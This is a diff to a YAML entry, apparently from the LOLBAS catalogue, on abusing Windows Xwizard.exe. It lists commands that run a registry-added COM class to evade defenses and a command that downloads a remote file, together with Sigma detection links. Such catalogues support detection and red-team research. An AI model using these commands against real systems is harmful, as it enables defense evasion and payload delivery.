@@ -1,7 +1,7 @@
 ---
 Name: Xwizard.exe
 Description: Execute custom class that has been added to the registry or download a file with Xwizard.exe
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
   - Command: xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: COM
   - Command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
     Description: Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.
     Usecase: Run a com object created in registry to evade defensive counter measures
@@ -18,7 +20,9 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-  - Command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM
+    Tags:
+      - Execute: COM
+  - Command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
     Description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.
     Usecase: Download file from Internet
     Category: Download
@@ -30,8 +34,6 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\xwizard.exe
   - Path: C:\Windows\SysWOW64\xwizard.exe
-Code_Sample:
-  - Code:
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_class_exec_xwizard.yml
   - Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dll_sideload_xwizard.yml
